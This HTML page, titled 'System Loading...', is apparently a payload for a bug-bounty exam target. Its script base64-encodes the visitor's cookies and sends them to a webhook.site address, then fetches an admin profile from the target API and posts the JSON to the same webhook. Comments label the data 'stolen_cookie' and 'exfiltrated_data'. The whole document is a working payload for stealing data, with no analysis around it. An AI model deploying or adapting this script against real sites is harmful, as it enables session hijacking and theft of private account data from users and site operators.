<!DOCTYPE html>
<html>
<body>
    <h1>System Loading...</h1>
    <script>
        const myWebhook = "https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283";
        const targetProfile = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";

        // 1. Try to grab the session cookie (if not HttpOnly)
        if (document.cookie) {
            fetch(myWebhook + "?stolen_cookie=" + btoa(document.cookie));
        }

        // 2. Fetch the Admin's private profile data and send it to your webhook
        // This is where the Flag or the Admin's sensitive details usually live
        fetch(targetProfile)
            .then(response => response.json())
            .then(data => {
                // Send the actual JSON data to your webhook as a POST
                fetch(myWebhook, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        status: "exfiltrated_data",
                        admin_info: data
                    })
                });
            })
            .catch(err => fetch(myWebhook + "?error=" + btoa(err)));
    </script>
</body>
</html>
